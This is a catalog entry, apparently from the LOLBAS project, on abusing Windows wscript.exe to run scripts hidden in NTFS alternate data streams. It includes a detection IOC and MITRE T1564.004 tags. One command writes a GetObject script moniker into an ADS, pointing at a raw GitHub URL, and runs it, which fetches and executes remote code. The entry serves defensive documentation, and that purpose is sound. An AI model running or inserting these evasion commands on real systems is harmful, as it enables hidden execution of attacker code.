---
Name: Wscript.exe
Description: Used by Windows to execute scripts
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: wscript c:\ads\file.txt:script.vbs
    Description: Execute script stored in an alternate data stream
    Usecase: Execute hidden code to evade defensive counter measures
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js
    Description: Download and execute script stored in an alternate data stream
    Usecase: Execute hidden code to evade defensive counter measures
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\wscript.exe
  - Path: C:\Windows\SysWOW64\wscript.exe
Code_Sample:
- Code:
Detection:
 - IOC: Wscript.exe executing code from alternate data streams
Resources:
  - Link: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
Acknowledgement:
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
  - Person: SaiLay(valen)
    Handle: '@404death'
---
